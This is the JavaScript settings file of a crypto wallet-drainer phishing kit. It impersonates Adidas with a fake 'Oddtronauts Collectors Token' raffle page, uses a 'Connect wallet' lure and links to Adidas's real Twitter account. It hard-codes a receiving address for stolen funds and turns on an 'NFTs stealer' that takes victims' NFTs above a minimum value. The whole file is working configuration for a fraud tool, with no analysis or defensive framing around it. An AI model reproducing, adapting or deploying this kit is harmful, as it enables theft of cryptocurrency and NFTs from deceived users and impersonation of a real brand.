const receiveAddress = "0x237f0A6c126F979cEd363079f7Cc0bB848e1802B";

const collectionInfo = {
    name: "Oddtronauts",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/adidasoriginals",
        instagram: "",
    },
}

const indexPageInfo = {
    backgroundImage: "background.MP4", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "COLLECTORS TOKEN",
}

const claimPageInfo = {
    title: "COLLECTORS<br>TOKEN", // <br> is a line break
    shortDescription: "SHOW YOUR LOYALTY.",
    longDescription: "A Oddtronauts TOKEN IS A SIGN YOU’VE BEEN PART OF ADIDAS SINCE THE START. IT GIVES YOU EARLY ACCESS TO MERCH, EVENTS AND MORE.",

    claimButtonText: "RAFFLE NOW",

    image: "logo.gif", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.09,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "RAFFLE {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "RAFFLE NOW",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
